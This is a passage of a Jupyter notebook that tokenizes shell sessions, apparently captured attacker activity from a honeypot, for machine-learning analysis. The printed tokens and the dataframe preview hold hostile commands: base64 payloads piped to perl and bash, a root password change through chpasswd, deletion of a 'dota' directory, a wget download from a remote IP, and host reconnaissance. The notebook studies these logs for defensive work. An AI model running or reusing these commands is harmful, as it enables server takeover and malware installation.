'BI', 'K', 'Sc', 'p', 'QT', '0', 'm', 'NE', 'Av', 'N', '1', 'h', 'AK', '1', 'VY', 'SD', 'cm', 'ME', 'sq', 'N', 'VB', 'OK', 'i', 'VR', 'RF', '8', 'q', 'Mk', 'E', '8', 'OS', 'JE', 'SD', 'cm', 'ME', 'kr', 'Uk', 'R', 'AP', 'l', 'BI', 'QC', 'gi', 'Y', 'EA', 'o', 'Im', 'BA', 'K', 'Sc', 'p', 'Pz', 'kn', 'NV', 'Yo', 'I', '1', 'R', 'AK', 'SM', 's', 'Wy', 'gi', 'MV', 'I', '3', 'Vj', 'FV', 'PU', 'J', 'MS', 'y', 'gm', 'RU', 'Yo', 'Ij', 'BU', 'K', 'CN', 'YX', 'Sg', 'j', 'NF', 'si', 'Qm', 'BA', 'KC', 'Jg', 'QC', 'gi', 'Y', 'ER', 'f', 'PE', 'Yl', 'VD', 'ky', 'Y', 'F', '0', 'o', 'I', 'ih', 'ELD', 'V', 'QT', 'ik', 'j', 'KE', 'Ir', 'Q', 'ih', 'E', 'PE', 'Vd', 'RD', '03', 'OE', 'Iu', 'UE', 'h', 'AK', 'CJ', 'g', 'QD', '8', 'w', 'SE', 'Ao', 'Im', 'BA', 'O', 'jY', '4', 'Q', 'Co', 'i', 'MV', 'A', '7', 'Vy', 'l', 'DOT', 'ZY', 'QC', '83', 'WE', 'Ar', 'VV', 'h', 'IN', 'y', 'Yw', 'Sy', 'o', '1', 'UE', '4', 'q', 'J', 'VF', 'EX', 'yo', 'y', 'QT', 'w', '5', 'Ik', 'R', 'IN', 'y', 'Yw', 'S', 'St', 'S', 'REA', '+', 'UE', 'h', 'AK', 'CJ', 'g', 'QC', 'gi', 'YE', 'Ap', 'Jy', 'E', '/', 'O', 'Sc', '1', 'V', 'ig', 'j', 'VE', 'Ap', 'Iy', 'xb', 'K', 'CI', 'x', 'UD', 'd', 'WM', 'VU', '9', 'Qk', 'x', 'LK', 'CZ', 'FR', 'ig', 'i', 'MF', 'Qo', 'I', '1', 'hd', 'K', 'CM', '0', 'Wy', 'J', 'CY', 'EA', 'o', 'Im', 'BA', 'KC', 'Jg', 'RF', '88', 'Jl', '1', 'SOF', 'Y', '1', 'T', 'ig', 'j', 'VE', 'Ao', 'Qj', 'BR', 'Ny', 'JY', 'RC', 'x', 'CK', 'E', '4', 'o', 'Qj', 'FQ', 'N', '1', 'Yx', 'VT', '1', 'CK', 'F', 'si', 'Qm', 'BA', 'K', 'CI', 'h', 'XS', 'J', 'CY', 'EA', 'o', 'Ii', 'FS', 'OT', 'cx', 'VT', 'x', 'G', 'WE', 'go', 'Qj', 'F', 'TO', '1', 'Y', 't', 'S', 'zd', 'X', 'MU', 'k', '8', 'J', 'lx', 'CK', 'y', 'Io', 'RD', 'x', 'XM', 'UF', 'f', 'P', 'Sc', '1', 'Uy', 'h', 'C', 'UE', 'Ip', 'J', 'll', 'J', 'OF', 'Z', 'MQ', 'isi', 'KE', 'Q', '4', 'N', 'yl', 'R', 'PT', 'Z', 'FV', 'jt', 'S', 'KE', 'wo', 'Qj', 'FCP', 'j', 'cx', 'RT', 'xV', 'XV', 'Q', '7', 'Vz', 'FBO', 'y', 'Io', 'TC', 'gi', 'KE', 'Q', '4', 'Vz', 'V', 'SN', '1', 'Y', 'p', 'WT', '0', 'm', 'NE', 'Ir', 'I', 'ih', 'EOS', 'Vd', 'V', 'Do', '2', 'V', 'UU', 'o', 'Ql', 'BA', 'Xy', 'h', 'CM', 'VI', '4', 'Nz', 'FF', 'KE', 'J', 'QQ', 'Ch', 'CM', 'VA', '7', 'Vy', 'l', 'DOT', 'ZY', 'Q', 'io', 'zT', 'Co', 'o', 'Ii', 'Fd', 'Ik', 'BI', 'K', 'ig', 'i', 'IV', 'I', '5', 'Nz', 'FV', 'PE', 'ZY', 'SC', 'wi', 'RF', 'si', 'R', '1', 'Qq', 'Ik', 'BJ', 'Uz', '02', 'KE', 'A', '5', 'Rk', 'VY', 'ODY', 'x', 'RD', 'x', 'CI', 'V', 'si', 'Qm', 'BA', 'K', 'CI', 'h', 'TV', '8', '+', 'Mm', 'BI', 'K', 'SY', 'l', 'RD', 'kn', 'K', 'UU', '8', 'Vy', 'x', 'JK', 'CN', 'U', 'QD', 'Al', 'XF', 'si', 'QE', 'h', 'AK', 'CJ', 'gQ', 'Dh', 'W', 'QU', '87', 'N', '2', 'BA', 'K', 'SY', 'l', 'RD', 'kn', 'K', 'UU', '8', 'Vy', 'xb', 'KC', 'Jg', 'QC', 'gi', 'Y', 'Co', 'o', 'Im', 'BA', 'KC', 'Z', 'FR', 'ig', 'i', 'Q', 'EQ', '4', 'Nj', 'FE', 'PE', 'Y', '1', 'Uz', 'x', 'SY', 'F', '1', 'f', 'P', '0', 'Jg', 'T', 'zd', 'F', 'UU', 'Qq', 'Uj', 'B', 'PK', 'j', 'Ih', 'Wy', 'J', 'CY', 'EA', 'o', 'Im', 'BA', 'KC', 'J', 'gQ', 'Dx', 'GN', 'VQ', '9', 'N', 'yl', 'OK', 'CZ', 'FT', 'jk', '3', 'MT', '87', 'Rz', 'FP', 'OD', 'J', 'BU', 'Dg', '2', 'LU', 'so', 'I', 'ik', 'u', 'KE', 'J', 'QQ', 'C', 'km', 'JU', 'Q', '5', 'Jy', 'l', 'FP', 'F', 'cs', 'SS', '5', 'Q', 'SE', 'Ao', 'Im', 'BA', 'Xz', '8', 'y', 'I', 'UU', '7', 'Jy', '1', 'JO', 'UJ', 'g', 'SC', 'km', 'JU', 'Q', '5', 'Jy', 'l', 'FP', 'F', 'cs', 'QC', '83', 'WE', 'Ar', 'VV', 'k', '7', 'LD', 'Mp', 'PS', '9', 'V', 'UU', 'Q', '+', 'Uy', 'RM', 'LE', 'd', 'VPC', 't', 'FT', 'FE', 'sR', 'VR', 'f', 'Ny', 'Yx', 'Wy', 'wy', 'U', 'FI', '/', 'N', 'VB', 'ON', 'l', 'Mk', 'Uj', 'cz', 'XT', 'w', '5', 'J', '0', 'x', 'RK', 'y', 'Mp', 'XV', '83', 'I', 'lk', '7', 'LD', 'Mp', 'PS', '9', 'V', 'UU', 'Q', '+', 'Uy', 'RM', 'LE', 'd', 'UR', 'Ct', 'S', 'REA', '+', 'UE', 'h', 'AK', 'CJ', 'g', 'QC', 'gi', 'Y', 'EA', 'o', 'Jy', 'l', 'FP', 'Sc', '1', 'U', 'jt', 'CY', 'EQ', '4', 'Nj', 'FE', 'PE', 'Y', '1', 'Uz', 'x', 'TT', 'Co', 'o', 'Im', 'BA', 'KC', 'dU', 'QD', 'k', '2', 'U', 'VM', '6', 'Nj', 'h', 'AK', 'i', 'Ix', 'QT', 'km', 'MV', 'Jf', 'OT', 'ct', 'Uy', 'gj', 'VV', '4', 'o', 'Jz', 'F', 'SK', '1', 'Yk', 'TT', '5', 'E', 'JE', '02', 'Q', 'lx', 'PK', 'j', 'Ih', 'Wy', 'gi', 'Y', 'EA', 'o', 'Im', 'BA', 'KC', 'Jg', 'QC', 'gi', 'Y', 'EA', 'o', 'Im', 'BA', 'KC', 'Jg', 'QC', 'gi', 'Y', 'Co', 'o', 'Im', 'BA', 'KC', 'Jg', 'QC', 'gi', 'IV', 'I', '5', 'Nz', 'FV', 'PE', 'ZY', 'Q', 'Do', '2', 'WU', 'U', '9', 'JV', '1', 'OX', 'z', '0', 'mX', 'UE', 'q', 'Ik', 'BIO', 'VY', '1', 'V', 'Dom', 'X', 'VM', '9', 'J', 'il', 'ZO', '0', 'Yl', 'TT', 'ky', 'Q', 'EQ', '4', 'Nj', 'FE', 'PE', 'Y', '1', 'Uz', 'x', 'S', 'RE', 'k', '2', 'Uz', 'E', '9', 'Kj', 'VM', 'UD', 'cy', 'RF', 'si', 'Qm', 'BA', 'K', 'CI', 'h', 'XS', 'gm', 'NU', 'w', '8', 'Vj', 'R', 'AP', 'l', 'BI', 'QC', 'gi', 'Y', 'EA', 'o', 'Im', 'BA', 'KC', 'cp', 'RS', '09', 'Jz', 'V', 'SO', '0', 'N', 'MK', 'ig', 'iY', 'EA', 'o', 'J', '1', 'Qq', 'Pz', 'B', '9', 'Cg', '==', 'Ġ|', 'Ġbase', '64', 'Ġ--', 'decode', 'Ġ|', 'Ġperl', 'Ġ;', 'Ġrm', 'Ġ-', 'rf', 'Ġ/', 'var', '/', 'tmp', '/', 'dot', 'a', '*', 'Ġ;', 'Ġsleep', 'Ġ15', 's', 'Ġ&&', 'Ġcd', 'Ġ/', 'var', '/', 'tmp', 'Ġ;', 'Ġecho', 'ĠI', 'y', 'E', 'vY', 'ml', 'uL', '2', 'J', 'hc', '2', 'gK', 'Y', '2', 'Qg', 'L', '3', 'Rtc', 'Ak', 'K', 'cm', '0', 'g', 'LX', 'Jm', 'IC', '5', 'zc', '2', 'gK', 'cm', '0', 'g', 'LX', 'Jm', 'IC', '5', 'tb', '3', 'Vud', 'G', 'Zz', 'C', 'nJ', 't', 'IC', '1', 'yZ', 'i', 'Au', 'W', 'DE', 'z', 'LX', 'V', 'ua', 'X', 'gK', 'bW', 'tk', 'aX', 'Ig', 'L', 'lg', 'x', 'My', '11', 'b', 'ml', '4', 'Cm', 'Nk', 'IC', '5', 'Y', 'MT', 'M', 'td', 'W', '5', 'pe', 'A', 'pt', 'di', 'Av', 'dmFy', 'L', '3', 'Rtc', 'C', '9', 'kb', '3', 'Rh', 'Ln', 'R', 'hci', '5', 'ne', 'iB', 'kb', '3', 'Rh', 'Ln', 'R', 'hci', '5', 'ne', 'gp', '0', 'YXI', 'ge', 'GY', 'g', 'ZG', '90', 'YS', '50', 'YXI', 'uZ', '3', 'o', 'Kc', '2', 'xl', 'ZX', 'Ag', 'M', '3', 'Mg', 'Ji', 'Y', 'gY', '2', 'Qg', 'Ln', 'J', 'ze', 'W', '5', 'j', 'O', 'yB', 'j', 'YX', 'Qg', 'L', '3', 'Rtc', 'C', '8', 'u', 'W', 'DE', 'z', 'LX', 'V', 'ua', 'X', 'gv', 'Ln', 'J', 'ze', 'W', '5', 'jL', '2', 'lua', 'XR', 'hbG', 'wg', 'f', 'CB', 'i', 'YX', 'No', 'IDI', '+', 'M', 'SY', 'K', 'ZXh', 'pd', 'CA', 'w', 'Ġ|', 'Ġbase', '64', 'Ġ--', 'decode', 'Ġ|', 'Ġbash', 'Ġ;', 'Ġcat', 'Ġ/', 'proc', '/', 'cpuinfo', 'Ġ|', 'Ġgrep', 'Ġname', 'Ġ|', 'Ġwc', 'Ġ-', 'l', 'Ġ;', 'Ġecho', 'Ġroot', ':', '01', 'Bm', 'Lg', '8', 'oz', 'Mo', 'Q', 'Ġ|', 'Ġch', 'passwd', 'Ġ|', 'Ġbash', 'Ġ;', 'Ġecho', 'Ġ32', '1', 'Ġ>', 'Ġ/', 'var', '/', 'tmp', '/.', 'var', '035', '22', '123', 'Ġ;', 'Ġrm', 'Ġ-', 'rf', 'Ġ/', 'var', '/', 'tmp', '/.', 'var', '035', '22', '123', 'Ġ;', 'Ġcat', 'Ġ/', 'var', '/', 'tmp', '/.', 'var', '035', '22', '123', 'Ġ|', 'Ġhead', 'Ġ-', 'n', 'Ġ1', 'Ġ;', 'Ġcat', 'Ġ/', 'proc', '/', 'cpuinfo', 'Ġ|', 'Ġgrep', 'Ġname', 'Ġ|', 'Ġhead', 'Ġ-', 'n', 'Ġ1', 'Ġ|', 'Ġa', 'wk', 'Ġ{', 'print', 'Ġ$', '4', ',$', '5', ',$', '6', ',$', '7', ',$', '8', ',$', '9', ';}', 'Ġ;', 'Ġfree', 'Ġ-', 'm', 'Ġ|', 'Ġgrep', 'ĠMem', 'Ġ|', 'Ġa', 'wk', 'Ġ{', 'print', 'Ġ$', '2', 'Ġ,', '$', '3', ',', 'Ġ$', '4', ',', 'Ġ$', '5', ',', 'Ġ$', '6', ',', 'Ġ$', '7', '}', 'Ġ;', 'Ġls', 'Ġ-', 'lh', 'Ġ$', 'which', 'Ġls', 'Ġ;', 'Ġwhich', 'Ġls', 'Ġ;', 'Ġc', 'ront', 'ab', 'Ġ-', 'l', 'Ġ;', 'Ġw', 'Ġ;', 'Ġun', 'ame', 'Ġ-', 'm', 'Ġ;', 'Ġcat', 'Ġ/', 'proc', '/', 'cpuinfo', 'Ġ|', 'Ġgrep', 'Ġmodel', 'Ġ|', 'Ġgrep', 'Ġname', 'Ġ|', 'Ġwc', 'Ġ-', 'l', 'Ġ;', 'Ġtop', 'Ġ;', 'Ġun', 'ame', 'Ġ;', 'Ġun', 'ame', 'Ġ-', 'a', 'Ġ;', 'Ġl', 'sc', 'pu', 'Ġ|', 'Ġgrep', 'ĠModel', 'Ġ;']\n",
            "['cd', '/', 't', '##mp', '|', '|', '/', 'var', '/', 't', '##mp', '|', '|', '/', 'dev', '/', 'sh', '##m', ';', 'echo', 'z', '##x', '##zh', '##bc', '##b', '##1', '##bn', '##bh', '##y', '##2', '##sg', '##dt', '##0', '+', '[UNK]', '+', 'u', '##j', '##0', '##pm', '##0', '##uw', '##rz', '##8', '##y', '##y', '##f', '##1', '##fk', '##ci', '##9', '##kt', '##fu', '##ws', '##80', '##rd', '##rh', '##ll', '##bird', '##ru', '##rs', '##c', '+', '[UNK]', '/', '[UNK]', '/', '[UNK]', '+', '[UNK]', '/', '[UNK]', '/', '[UNK]', '+', 'j', '##0', '##rc', '##k', '##j', '##j', '##gr', '##il', '##cy', '##eg', '##p', '##j', '##y', '##fs', '##o', '##1', '##db', '##ws', '##g', '##j', '##ve', '##ap', '##j', '##du', '##un', '##ud', '##m', '##rd', '##d', '##x', '##ve', '##k', '/', 'mi', '##fl', '##ot', '##df', '##uy', '##gins', '##uz', '##rth', '##bi', '##k', '##j', '##g', '##q', '##do', '##2', '##oe', '##aq', '##ik', '##be', '##x', '##z', '##wn', '##ku', '##8', '+', '[UNK]', '+', '[UNK]', '/', '[UNK]', '/', '[UNK]', '/', '[UNK]', '/', '[UNK]', '+', '[UNK]', '/', '[UNK]', '/', '[UNK]', '/', '[UNK]', '+', '[UNK]', '+', '[UNK]', '/', '[UNK]', '/', 'ps', '##y', '##1', '##tt', '##w', '##j', '##tc', '##o', '##9', '##v', '##k', '##f', '##joy', '##y', '##0s', '##c', '##g', '##j', '##je', '##aq', '##mi', '##fb', '##ik', '##j', '##g', '##q', '##c', '##gn', '##pu', '##g', '##6', '##nl', '##ff', '##k', '##c', '##ja', '##q', '##som', '##tu', '##u', '+', '[UNK]', '/', '[UNK]', '/', '[UNK]', '+', '[UNK]', '+', '[UNK]', '/', '[UNK]', '+', '[UNK]', '/', '[UNK]', '/', '[UNK]', '/', '[UNK]', '+', '[UNK]', '/', '[UNK]', '+', '[UNK]', '/', 'p', '##fy', '##1', '##uj', '##1', '##gn', '##vi', '##8', '##v', '##0', '##x', '##em', '##ju', '##pi', '##zd', '##wl', '##vu', '##8', '##r', '##v', '##1', '##to', '##1', '##yt', '##sz', '##k', '##3', '##m', '##v', '##0', '+', 'u', '##j', '##1', '##oo', '##1', '##z', '##vr', '##sl', '##x', '##ve', '##av', '##mm', '##bc', '##ks', '##m', '##k', '##qi', '##5', '##q', '##sea', '##oi', '##mba', '##k', '##c', '##j', '##g', '##q', '##dl', '##g', '##x', '##vi', '##5', '##ni', '##vd', '##x', '##zo', '##ii', '##u', '##0', '+', '[UNK]', '/', '[UNK]', '/', '[UNK]', '/', '[UNK]', '/', 'q', '##mb', '##p', '##n', '##0', '##c', '##1', '##rd', '##wl', '##u', '##v', '##m', '##qu', '##k', '##bo', '##kk', '##j', '##fp', '##d', '##x', '##ste', '##g', '##3', '##j', '##j', '##bl', '##k', '##j', '##vr', '##uy', '##ps', '##q', '##t', '##w', '##5', '##ik', '##x', '##j', '##xy', '##ts', '##rea', '+', '[UNK]', '/', '[UNK]', '+', '[UNK]', '/', '[UNK]', '+', '[UNK]', '+', '[UNK]', '/', 'me', '##hak', '##c', '##j', '##g', '##q', '##c', '##gi', '##ye', '##ao', '##im', '##ba', '##k', '##c', '##j', '##g', '##q', '##c', '##gi', '##ye', '##a', '/', '[UNK]', '/', '[UNK]', '/', '[UNK]', '/', '[UNK]', '+', '[UNK]', '+', 'v', '##k', '##v', '##ho', '##z', '##ch', '##x', '##sg', '##j', '##ve', '##ap', '##iy', '##hak', '##k', '##j', '##gr', '##d', '##w', '##m', '##ju', '##m', '##7', '##v', '##z', '##ff', '##pf', '##d', '##nst', '##l', '##w', '##v', '##va', '/', 'm', '##0', '##w', '##q', '##k', '##c', '##j', '##g', '##q', '##c', '##gi', '##ye', '##ao', '##im', '##ba', '##k', '##c', '##j', '##g', '##q', '##c', '##gi', '##mu', '##i', '+', '[UNK]', '/', '[UNK]', '+', 'nz', '##ff', '##pf', '##d', '##n', '##v', '##t', '##k', '##ni', '##v', '##0', '##oi', '##k', '##xa', '##ks', '##yp', '##wt', '##0', '##m', '##n', '##v', '##m', '+', '[UNK]', '+', '[UNK]', '/', 'me', '##hak', '##c', '##j', '##g', '##q', '##c', '##gi', '##ye', '##ao', '##im', '##ba', '##k', '##cy', '##1', '##wd', '##o', '##3', '##m', '##fs', '##iq', '##mba', '##xy', '##gi', '##ye', '##ao', '##ii', '##f', '##di', '##k', '##j', '##g', '##q', '##d', '##8', '##ws', '##v', '##0', '##iq', '##elt', '##pt', '##yo', '##q', '##do', '##3', '##ku', '##m', '##4', '##ny', '##1', '##fk', '##cd', '##m', '##ki', '##gi', '##iu', '##0', '+', '[UNK]', '+', '[UNK]', '+', '[UNK]', '+', '[UNK]', '/', '[UNK]', '+', '[UNK]', '/', '[UNK]', '+', '[UNK]', '+', '[UNK]', '+', '[UNK]', '/', '[UNK]', '/', '[UNK]', '/', '[UNK]', '+', '[UNK]', '/', '[UNK]', '/', '[UNK]', '+', '[UNK]', '/', '[UNK]', '/', '[UNK]', '+', 'v', '##z', '##f', '##dp', '##cd', '##us', '##yp', '##si', '##uk', '##5', '##q', '##mb', '##ik', '##sch', '##q', '##th', '##w', '##x', '##vr', '##fo', '##tc', '##s', '##q', '##c', '##8', '##z', '##ve', '##as', '##m', '##kr', '##bi', '##k', '##bi', '##q', '##c', '##gi', '##ye', '##ao', '##im', '##ba', '##ou', '##zd', '##ui', '##gi', '##qu', '##0', '+', 'mm', '##be', '##pc', '##ys', '##q', '##c', '##8', '##y', '##y', '##fm', '##u', '##umb', '##ep', '##cy', '##s', '##q', '##c', '##8', '##j', '##ve', '##as', '##q', '##z', '##r', '##v', '##lli', '##x', '##ud', '##hs', '##tes', '##q', '##mi', '##fb', '##ik', '##j', '##g', '##q', '##c', '##gi', '##ye', '##ao', '##im', '##ba', '##xy', '##gm', '##wu', '##u', '+', 'j', '##z', '##ba', '##oj', '##y', '##4', '##q', '##ck', '##nium', '##oi', '##1', '##rd', '##k', '##cm', '##4', '##wy', '##j', '##cy', '##ea', '##oi', '##mba', '##k', '##c', '##j', '##g', '##q', '##c', '##gi', '##mum', '##9', '##ny', '##k', '/', '[UNK]', '/', '[UNK]', '/', '[UNK]', '/', 'kc', '##nu', '##x', '##sg', '##j', '##j', '##fs', '##iq', '##mba', '##k', '##cc', '##tr', '##tt', '##gm', '##vi', '##4', '##nz', '##xi', '##ker', '##v', '##lz', '##ek', '##nea', '##p', '##j', '##v', '##0', '##7', '##lc', '##vu', '##q', '##cs', '##2', '##x', '##ea', '##p', '##j', '##v', '##0', '##7', '##ld', '##vu', '##qi', '##oz', '##tc', '##o', '/', '[UNK]', '/', '[UNK]', '/', 'nl', '##m', '##hp', '##sg', '##it', '##ui', '##oi', '##je', '/', '[UNK]', '/', 'nl', '##m', '##hp', '##sg', '##im', '##t', '##8', '##2', '##uy', '##u', '##9', '##ke', '##je', '##wy', '##j', '##h', '##vc', '##o', '##8', '##v', '##z', '##vc', '##k', '##cz', '##v', '##tz', '##km', '##nea', '+', '[UNK]', '/', '[UNK]', '+', '[UNK]', '/', '[UNK]', '/', '[UNK]', '+', '[UNK]', '+', 'nz', '##ff', '##pf', '##j', '##g', '##x', '##sg', '##im', '##s', '##q', '##w', '##vc', '##1', '##b', '##ks', '##y', '##5', '##sf', '##8', '/', '[UNK]', '/', 'mm', '##b', '##d', '##k', '##ci', '##pi', '##z', '##g', '##2', '##wu', '##m', '##5', '##nl', '##fb', '##os', '##z', '##c', '##qi', '##5', '##q', '##sea', '##oi', '##mba', '##k', '##c', '##j', '##g', '##q', '##c', '##gi', '##ms', '##rf', '##m', '##f', '##q', '##t', '##wy', '##km', '##ou', '##g', '/', 'n', '##01', '##gp', '##sz', '##ft', '##t', '##k', '##3', '##ve', '##av', '##mi', '##fu', '##oj', '##z', '##vr', '##s', '##5', '##q', '##sea', '##oi', '##mba', '##k', '##c', '##j', '##g', '##q', '##c', '##gi', '##mu', '##q', '##4', '##vi', '##0', '/', 'p', '##fy', '##1', '##tc', '##sz', '##w', '##vi', '##5', '##nl', '##v', '##pp', '##uy', '##0s', '##ck', '##mo', '##ug', '##q', '##m', '##0', '##w', '##q', '##k', '##c', '##j', '##g', '##q', '##c', '##gi', '##ye', '##ao', '##im', '##be', '##x', '##z', '##l', '##g', '##q', '##e', '##0', '##vr', '##i', '##1', '##mo', '##1', '##ct', '##rs', '##5', '##q', '##sea', '##oi', '##mba', '##k', '##c', '##j', '##g', '##q', '##c', '##gm', '##wu', '##u', '+', 'j', '##z', '##bb', '##ik', '##j', '##g', '##q', '##c', '##gi', '##ye', '##a', '/', '[UNK]', '+', '[UNK]', '/', 'o', '##ed', '##f', '##vd', '##ky', '##y', '##f', '##w', '##v', '##mm', '##be', '##oed', '##f', '##vd', '##k', '##3', '##le', '##ku', '##ue', '##hak', '##c', '##j', '##g', '##q', '##c', '##gi', '##ye', '##ao', '##ji', '##1', '##mo', '##1', '##ct', '##r', '##v', '##8', '##q', '##j', '##d', '##k', '##pm', '##y', '##q', '##0s', '##s', '##5', '##q', '##sco', '##oi', '##mba', '##k', '##c', '##j', '##g', '##q', '##c', '##gi', '##iu', '##0', '+', '[UNK]', '+', '[UNK]', '+', '[UNK]', '+', '[UNK]', '/', '[UNK]', '+', '[UNK]', '+', '[UNK]', '+', '[UNK]', '+', 'v', '##j', '##lu', '##oj', '##z', '##vr', '##t', '##8', '##y', '##y', '##f', '##0', '##oj', '##z', '##f', '##jo', '##zy', '##0', '##wy', '##j', '##cy', '##ea', '##oi', '##mba', '##k', '##c', '##j', '##g', '##q', '##c', '##gi', '##ye', '##ao', '##ii', '##foot', '##db', '##vc', '##5', '##q', '##sea', '##oi', '##mba', '##k', '##c', '##j', '##g', '##q', '##c', '##gi', '##ye', '##a', '/', '[UNK]', '/', 'o', '##ed', '##f', '##vd', '##k', '##3', '##lf', '##si', '##q', '##mba', '##k', '##c', '##j', '##g', '##q', '##c', '##gi', '##ye', '##ao', '##ii', '##fs', '##ot', '##yl', '##rco', '##lls', '##uz', '##rde', '##mx', '##zi', '##0', '##us', '##uri', '##mbe', '##pf', '##y', '##1', '##t', '##jk', '##l', '##x', '##ui', '+', '[UNK]', '/', 'meg', '##qi', '##k', '##ct', '##v', '##th', '##cit', '##mx', '##n', '##fk', '##kk', '##cd', '##m', '##ki', '##gi', '##iu', '##0', '+', 'mm', '##bi', '##ks', '##zz', '##st', '##h', '##wt', '##ex', '##fk', '##ci', '##x', '##q', '##t', '##x', '##h', '##j', '##vu', '##6', '##nz', '##lp', '##k', '##j', '##j', '##g', '##x', '##sg', '##kit', '##8', '##u', '##ue', '##hak', '##cc', '##1', '##t', '##js', '##m', '##n', '##v', '##m', '##8', '##umb', '##ik', '##z', '##co', '##q', '##ch', '##cm', '##ue', '##8', '##ry', '##v', '##vo', '##j', '##c', '##5', '##ty', '##hc', '##rea', '+', '[UNK]', '+', '[UNK]', '/', 'mi', '##f', '##vo', '##0', '##c', '##x', '##sts', '##iy', '##e', '##q', '##8', '##v', '##j', '##vo', '##os', '##ct', '##tz', '##h', '##wt', '##fs', '##iq', '##eh', '##ak', '##ci', '##x', '##j', '##db', '##ul', '##v', '##tf', '##ks', '##ct', '##rt', '##t', '##gm', '##v', '##m', '##7', '##vi', '##1', '##lp', '##zd', '##n', '##vd', '##o', '##3', '##iu', '##8', '/', 'mm', '##b', '##d', '##k', '##ci', '##9', '##uz', '##k', '##2', '##wu', '##q', '##pu', '##0', '##w', '##q', '##k', '##c', '##j', '##gr', '##dek', '##ls', '##m', '+', 'u', '##j', '##ft', '##ot', '##zz', '##rd', '##x', '##w', '##x', '##um', '##6', '##v', '##1', '##vb', '##o', '##0', '##z', '##f', '##q', '##z', '##p', '##x', '##ve', '##av', '##mm', '##be', '##o', '##0', '##z', '##f', '##q', '##z', '##pt', '##tc', '##oo', '##im', '##be', '##x', '##zek', '##ls', '##m', '+', '[UNK]', '/', '[UNK]', '+', '[UNK]', '+', 'u', '##j', '##fe', '##of', '##yt', '##uz', '##t', '##wl', '##us', '/', 'n', '##01', '##uo', '##j', '##cht', '##18', '/', 'mm', '##b', '##d', '##k', '##ci', '##9', '##rz', '##k', '##3', '##me', '##cu', '##ue', '##hak', '##ci', '##x', '##j', '##db', '##ul', '##vs', '##p', '##j', '##j', '##f', '##do', '##fc', '##tt', '##zh', '##wt', '##v', '##0', '+', '[UNK]', '+', '[UNK]', '+', '[UNK]', '+', 'mm', '##be', '##pf', '##zd', '##q', '##z', '##p', '##v', '##x', '##v', '##q', '##6', '##ny', '##fp', '##k', '##c', '##nu', '##q', '##ck', '##km', '##sm', '##w', '##v', '##0', '##x', '##ep', '##f', '##zd', '##q', '##z', '##pw', '##n', '##v', '##q', '/', '[UNK]', '/', '[UNK]', '/', '[UNK]', '/', 'n', '##01', '##gp', '##sz', '##ft', '##t', '##k', '##3', '##ve', '##ku', '##ue', '##g', '##q', '##k', '##c', '##j', '##g', '##q', '##c', '##gm', '##v', '##v', '##ko', '##ij', '##fen', '##1', '##c', '##x', '##sts', '##2', '##nea', '##v', '##mm', '##be', '##ou', '##c', '##x', '##sts', '##2', '##ne', '##0', '##p', '##jk', '##vu', '##oj', '##z', '##vr', '##s', '##5', '##q', '##sco', '##oi', '##mba', '##k', '##cz', '##v', '##ws', '##gi', '##mum', '##9', '##ny', '##k', '/', '[UNK]', '+', '[UNK]', '+', 'u', '##eh', '##ak', '##c', '##j', '##g', '##q', '##c', '##gi', '##ye', '##ap', '##j', '##ye', '/', '[UNK]', '+', '[UNK]', '+', 'u', '##yr', '##ml', '##ed', '##v', '##pc', '##tf', '##tf', '##es', '##r', '##vr', '##f', '##ny', '##yx', '##wy', '##wy', '##uf', '##i', '/', 'n', '##vb', '##on', '##lm', '##ku', '##j', '##cz', '##xt', '##w', '##5', '##j', '##0', '##x', '##rky', '##mp', '##x', '##v', '##8', '##3', '##il', '##k', '##7', '##ld', '##mp', '##ps', '##9', '##vu', '##u', '##q', '+', 'u', '##yr', '##ml', '##ed', '##ur', '##cts', '##rea', '+', '[UNK]', '=', '=', '|', 'base', '##64', '-', '-', 'deco', '##de', '|', 'per', '##l', ';', 'rm', '-', 'rf', '/', 'var', '/', 't', '##mp', '/', 'dot', '##a', '*', ';', 'sleep', '15', '##s', '&', '&', 'cd', '/', 'var', '/', 't', '##mp', ';', 'echo', '[UNK]', '+', 'ms', '##yk', '##z', '##x', '##hp', '##dc', '##aw', '|', 'base', '##64', '-', '-', 'deco', '##de', '|', 'bash', ';', 'cat', '/', 'pro', '##c', '/', 'cpu', '##in', '##fo', '|', 'gr', '##ep', 'name', '|', 'wc', '-', 'l', ';', 'echo', 'root', ':', '01', '##bm', '##l', '##g', '##8', '##oz', '##mo', '##q', '|', 'ch', '##pass', '##wd', '|', 'bash', ';', 'echo', '321', '>', '/', 'var', '/', 't', '##mp', '/', '.', 'var', '##0', '##35', '##22', '##12', '##3', ';', 'rm', '-', 'rf', '/', 'var', '/', 't', '##mp', '/', '.', 'var', '##0', '##35', '##22', '##12', '##3', ';', 'cat', '/', 'var', '/', 't', '##mp', '/', '.', 'var', '##0', '##35', '##22', '##12', '##3', '|', 'head', '-', 'n', '1', ';', 'cat', '/', 'pro', '##c', '/', 'cpu', '##in', '##fo', '|', 'gr', '##ep', 'name', '|', 'head', '-', 'n', '1', '|', 'aw', '##k', '{', 'print', '$', '4', ',', '$', '5', ',', '$', '6', ',', '$', '7', ',', '$', '8', ',', '$', '9', ';', '}', ';', 'free', '-', 'm', '|', 'gr', '##ep', 'me', '##m', '|', 'aw', '##k', '{', 'print', '$', '2', ',', '$', '3', ',', '$', '4', ',', '$', '5', ',', '$', '6', ',', '$', '7', '}', ';', 'l', '##s', '-', 'l', '##h', '$', 'which', 'l', '##s', ';', 'which', 'l', '##s', ';', 'cr', '##ont', '##ab', '-', 'l', ';', 'w', ';', 'una', '##me', '-', 'm', ';', 'cat', '/', 'pro', '##c', '/', 'cpu', '##in', '##fo', '|', 'gr', '##ep', 'model', '|', 'gr', '##ep', 'name', '|', 'wc', '-', 'l', ';', 'top', ';', 'una', '##me', ';', 'una', '##me', '-', 'a', ';', 'l', '##sc', '##pu', '|', 'gr', '##ep', 'model', ';']\n"
          ]
        }
      ],
      "source": [
        "print(\"Longest Session Token Length:\" , len(train_data['session'][14].split(\" \")))\n",
        "print(train_data['uni_tokenized'][14])\n",
        "print(train_data['bert_tokenized'][14])"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 459
        },
        "id": "n7W3TGO03Cmh",
        "outputId": "337a73ef-0066-4e72-a0f7-bd25f18b1d27"
      },
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "0      rm -rf /var/run/1sh ; wget -c http://71.127.14...\n",
              "1      cat /proc/cpuinfo | grep name | wc -l ; echo r...\n",
              "2      cd /tmp || cd /var/run || cd /mnt || cd /root ...\n",
